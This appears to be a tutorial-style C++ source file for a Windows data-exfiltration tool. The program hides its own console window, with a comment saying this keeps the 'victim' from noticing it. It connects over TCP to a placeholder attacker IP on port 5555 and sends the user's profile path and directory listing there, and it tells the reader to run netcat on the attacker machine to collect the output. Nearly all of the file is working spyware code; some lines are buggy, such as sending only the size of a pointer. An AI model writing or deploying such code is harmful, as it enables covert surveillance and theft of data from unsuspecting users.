/* using winsock utility to now get warnings from compiler on use of older functionalities */
#define _WINSOCK_DEPRECATED_NO_WARNINGS
/* using Ws2_32.lib library for using sockets */
#pragma comment(lib, "Ws2_32.lib")
/* iostream - standard input/output utilities
   winsock2.h - networking utilities
   stdio.h - standard input/output utilities (needed for perror())
   stdlib.h - standard input/output utilities
   dirent.h - directory utilities
   string - string utilities */
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string>

/* userDirectory() function gets the value of %USERPROFILE% environment variable */
char *userDirectory()
{
    char *pPath;
    pPath = getenv("USERPROFILE");

    if (pPath != NULL)
    {
        return pPath;
    }
    else
    {
        perror("");
    }
}

int main()
{
    /* This will hide the program window so that victim does know that this program is running */
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    /* WSADATA: This data type (it's a struct) holds information about windows socket implementation.
       SOCKET: This data type stores the connection of the SOCKET type.
       SOCKADDR_IN: This data type (it's a struct) holds the details of socket connection. */
    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;

    /* Initialize usage of the winsock library (needed for opening a network connection) */
    WSAStartup(MAKEWORD(2, 0), &WSAData);
    /* Set up a TCP socket. AF_INET means address family for IPv4. SOCK_STREAM means that we want a TCP socket */
    server = socket(AF_INET, SOCK_STREAM, 0);

    /* This would set the IP address of the target we wish to sent the data to (that would be the attacker's IP address). 
       The port used would be 5555 and the IP address is IPv4 which is indicated by AF_INET */
    addr.sin_addr.s_addr = inet_addr("IP Addr");
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555);

    /* Connect to the previously set up target hot/port */
    connect(server, (SOCKADDR *)&addr, sizeof(addr));

    /* Get the user directory using the userDirectory function */
    char *pPath = userDirectory();
    /* Send the user directory path to the attacker. 
       This is followed by a newline so that the output received by the attacker is properly formatted - 1 entry per line */
    send(server, pPath, sizeof(pPath), 0);
    send(server, "\n", 1, 0);

    DIR *dir;
    struct dirent *ent;

    /* If else block opens the user's directory and then reads the entries in it. 
       All the entries are then sent back to the attacker's machine over the established TCP socket.
       A newline is also sent, so that the directory listing is displayed with one entry per line. 
       In case the directory cannot be opened, the program will display the associated error using the call to perror().
       There is also a call to memset in the while loop. That is used to zero out the directory name. 
       The reason is because if you don't do that, the output you get from this program would contain the directory names containing the left overs from the previous directories as well. 
       If you wish to see that, try commenting the memset function call and compile and run the program again. 
       Make sure you run netcat on the attacker machine to receive back the output! */
    if ((dir = opendir(pPath)) != NULL)
    {
        while ((ent = readdir(dir)) != NULL)
        {
            send(server, ent->d_name, sizeof(ent->d_name), 0);
            send(server, "\n", 1, 0);
            memset(ent->d_name, 0, sizeof(ent->d_name));
        }
        closedir(dir);
    }
    else
    {
        perror("");
    }

    /* Close the socket */
    closesocket(server);
    /* Clean up the Winsock library components */
    WSACleanup();
}